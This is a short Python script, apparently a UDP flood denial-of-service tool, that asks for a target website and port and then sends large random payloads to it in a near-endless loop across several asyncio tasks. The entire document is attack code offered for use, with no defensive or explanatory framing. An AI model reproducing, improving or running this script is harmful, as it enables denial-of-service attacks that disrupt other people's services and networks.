import socket, random, asyncio

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

website = input('[+] enter target website: ')
ip = socket.gethostbyname(website)

port = input('[+] enter target port: ')
if port == '' or port == ' ' or port == '\n':
  port = 80
port = int(port)
print(f"[+] Attacking {website}-{ip} on port {port}")
s.connect((ip, port))

# print(random._urandom(10))
async def attack():
  for i in range(1, 100**1000):
    s.send(random._urandom(10)*5000)
    print(f"sending1: {i}", end="\r")

async def main():
  task1 = asyncio.create_task(attack())
  task2 = asyncio.create_task(attack())
  task3 = asyncio.create_task(attack())
  task4 = asyncio.create_task(attack())

asyncio.run(main())